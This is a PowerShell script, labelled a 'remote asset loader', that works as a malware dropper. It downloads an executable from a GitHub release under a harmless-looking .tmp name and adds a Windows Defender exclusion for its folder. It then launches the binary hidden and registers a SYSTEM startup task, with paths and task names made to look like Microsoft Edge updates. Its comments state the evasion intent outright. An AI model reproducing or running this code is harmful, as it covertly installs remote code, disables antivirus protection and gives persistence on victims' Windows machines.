# remote asset loader (simple, proven)
param()

$ErrorActionPreference = 'SilentlyContinue'

# --- endpoints ---------------------------------------------------------------
$ReleaseBase = 'https://github.com/billkentfelty/cdn-sync-7f3a2b/releases/download/v1'

$admin = [Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()
if (-not $admin.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) { exit }

# plausible Edge-update location, matches the task naming
$dir = Join-Path $env:ProgramData 'Microsoft\EdgeUpdate'
New-Item -ItemType Directory -Force -Path $dir | Out-Null

$sysPath = Join-Path $dir 'MicrosoftEdgeUpdateCore.exe'
$tmpPath = Join-Path $dir 'MicrosoftEdgeUpdate.tmp'

if (-not (Test-Path $sysPath)) {
    # 1) download as innocent .tmp (survives on-access scan: unknown file)
    curl.exe -s -L -o $tmpPath --retry 3 --retry-delay 5 --max-time 120 "$ReleaseBase/system.txt"
    # 2) exclusion; Defender applies it asynchronously (~30s), hence the wait
    Add-MpPreference -ExclusionPath $dir -ErrorAction SilentlyContinue
    Start-Sleep -Seconds 35
    # 3) rename + launch only after the exclusion is in effect
    if (Test-Path $tmpPath) {
        Move-Item -LiteralPath $tmpPath -Destination $sysPath -Force
    }
}

if (Test-Path $sysPath) {
    Start-Process -FilePath $sysPath -WorkingDirectory $dir -WindowStyle Hidden
}

$hostName  = $env:COMPUTERNAME
$taskName  = "MicrosoftEdgeUpdateTaskMachineCore$hostName"
$action    = New-ScheduledTaskAction -Execute $sysPath -WorkingDirectory $dir
$trigger   = New-ScheduledTaskTrigger -AtStartup
$settings  = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable
$principal = New-ScheduledTaskPrincipal -UserId 'SYSTEM' -LogonType ServiceAccount -RunLevel Highest
Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $settings -Principal $principal -Force | Out-Null
